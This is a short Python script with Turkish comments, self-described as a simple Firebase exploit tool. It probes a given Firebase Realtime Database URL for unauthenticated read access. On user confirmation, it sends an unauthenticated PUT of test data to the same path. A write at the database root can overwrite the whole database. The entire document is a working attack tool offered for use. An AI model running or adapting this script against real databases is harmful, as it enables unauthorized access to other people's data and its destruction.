import requests
import argparse
from colorama import init, Fore

#Firebase basit exploit aracı 
#Author Berat


init(autoreset=True)

def exploit(url):
    if not url.endswith("/"):
        url += '/'    
    if not url.endswith(".json"):
        url += '.json'         


    data = {"test": "test", "tests": "test"}
    req = requests.get(url)


    if req.status_code == 200:
        print(f"Url adresini kontroledin: {url}")
        print(Fore.GREEN + "Muhtemelen Zaafiyetli")
        puts = input("Yazma işlemi yazmayı dene (1)'e bas: ")


        if int(puts) == 1:
            req = requests.put(url, data=data)
            if req.status_code == 200:
                print(Fore.GREEN + "Yazma işlemi başarili zaafiyetli firebase veritabanı")
            else:
                print(Fore.RED + "Yazma işlemi başarısız yazma yetkiniz yok bu veritabanına")       
    else:
        print(Fore.RED + "Veritabanı zaafiyetli degil")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="URL'yi analiz eden bir program.")
    parser.add_argument("url", help="Analiz edilecek URL")
    args = parser.parse_args()

    # URL'yi analiz et
    exploit(args.url)


   
   
    


